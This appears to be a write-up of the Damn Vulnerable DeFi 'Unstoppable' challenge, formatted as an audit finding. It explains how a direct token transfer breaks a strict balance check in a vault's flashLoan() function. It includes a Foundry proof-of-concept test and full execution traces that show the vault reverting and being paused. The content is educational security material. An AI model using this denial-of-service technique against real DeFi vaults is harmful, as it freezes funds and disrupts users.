# Damn Vulnerable Defi - Unstoppable
- Scope
    - UnstoppableVault.sol
    - UnstoppableMonitor.sol  
- Tools
		- [Foundry](https://github.com/foundry-rs/foundry)

# Findings

## Incorrect equality check in `flashLoan()`

### Summary
In the `flashLoan()` function, there is an equality check between `totalAssets()` and `convertToShares(totalSupply)`. However, a manual transfer of token to the vault does not update the totalSupply, which will cause an inbalance and between the 2 values as they both uses different calculation methods.

### Vulnerability Details
The `flashLoan()` function checks if the totalAssets is equal to totalSupply and causes a revert if they are not. However, both methods calculates the balance of the vault differently.
```diff
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (amount == 0) revert InvalidAmount(0); // fail early
        if (address(asset) != _token) revert UnsupportedCurrency(); // enforce ERC3156 requirement
        uint256 balanceBefore = totalAssets();
-        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement

        // transfer tokens out + execute callback on receiver
        ERC20(_token).safeTransfer(address(receiver), amount);

        // callback must return magic value, otherwise assume it failed
        uint256 fee = flashFee(_token, amount);
        if (
            receiver.onFlashLoan(msg.sender, address(asset), amount, fee, data)
                != keccak256("IERC3156FlashBorrower.onFlashLoan")
        ) {
            revert CallbackFailed();
        }

        // pull amount + fee from receiver, then pay the fee to the recipient
        ERC20(_token).safeTransferFrom(address(receiver), address(this), amount + fee);
        ERC20(_token).safeTransfer(feeRecipient, fee);

        return true;
    }
```

### Impact/Proof of Concept
By transferring 1 token into the vault, it will not update `totalSupply` in ERC20. Hence, causing an inbalance between balanceOf() the vault (1000001) and totalSupply (1000000) and causing `InvalidBalance()` error.
```
function test_unstoppable() public checkSolvedByPlayer {
        uint256 amount = 10e18;
        // Transfer token to vault
        token.transfer(address(vault), amount);

        // Call Flash loan and expect revert
        vm.expectRevert();
        vault.flashLoan(IERC3156FlashBorrower(player), address(token), 10e18, "");
    }
```
Results
```diff
[PASS] test_unstoppable() (gas: 71628)
Traces:
  [71628] UnstoppableChallenge::test_unstoppable()
    ├─ [0] VM::startPrank(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C])
    │   └─ ← [Return] 
    ├─ [12574] DamnValuableToken::transfer(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], 10000000000000000000 [1e19])
    │   ├─ emit Transfer(from: player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], to: UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264], amount: 10000000000000000000 [1e19])
    │   └─ ← [Return] true
    ├─ [0] VM::expectRevert(custom error f4844814:)
    │   └─ ← [Return] 
    ├─ [7286] UnstoppableVault::flashLoan(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 10000000000000000000 [1e19], 0x)
    │   ├─ [519] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   └─ ← [Return] 1000010000000000000000000 [1e24]
    │   ├─ [519] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   └─ ← [Return] 1000010000000000000000000 [1e24]
    │   └─ ← [Revert] InvalidBalance()
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return] 
    ├─ [0] VM::prank(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   └─ ← [Return] 
    ├─ [0] VM::expectEmit()
    │   └─ ← [Return] 
    ├─ emit FlashLoanStatus(success: false)
    ├─ [26828] UnstoppableMonitor::checkFlashLoan(100000000000000000000 [1e20])
    │   ├─ [262] UnstoppableVault::asset() [staticcall]
    │   │   └─ ← [Return] DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b]
    │   ├─ [7286] UnstoppableVault::flashLoan(UnstoppableMonitor: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], DamnValuableToken: [0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b], 100000000000000000000 [1e20], 0x)
    │   │   ├─ [519] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000010000000000000000000 [1e24]
    │   │   ├─ [519] DamnValuableToken::balanceOf(UnstoppableVault: [0x1240FA2A84dd9157a0e76B5Cfe98B1d52268B264]) [staticcall]
    │   │   │   └─ ← [Return] 1000010000000000000000000 [1e24]
-    │   │   └─ ← [Revert] InvalidBalance()
    │   ├─ emit FlashLoanStatus(success: false)
    │   ├─ [8817] UnstoppableVault::setPause(true)
    │   │   ├─ emit Paused(account: UnstoppableMonitor: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5])
    │   │   └─ ← [Stop] 
    │   ├─ [5178] UnstoppableVault::transferOwnership(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   │   ├─ emit OwnershipTransferred(previousOwner: UnstoppableMonitor: [0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5], newOwner: deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946])
    │   │   └─ ← [Stop] 
    │   └─ ← [Stop] 
    ├─ [349] UnstoppableVault::paused() [staticcall]
    │   └─ ← [Return] true
    ├─ [0] VM::assertTrue(true, "Vault is not paused") [staticcall]
    │   └─ ← [Return] 
    ├─ [405] UnstoppableVault::owner() [staticcall]
    │   └─ ← [Return] deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946]
    ├─ [0] VM::assertEq(deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], deployer: [0xaE0bDc4eEAC5E950B67C6819B118761CaAF61946], "Vault did not change owner") [staticcall]
    │   └─ ← [Return] 
    └─ ← [Stop] 

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 1.63ms (404.26µs CPU time)
```
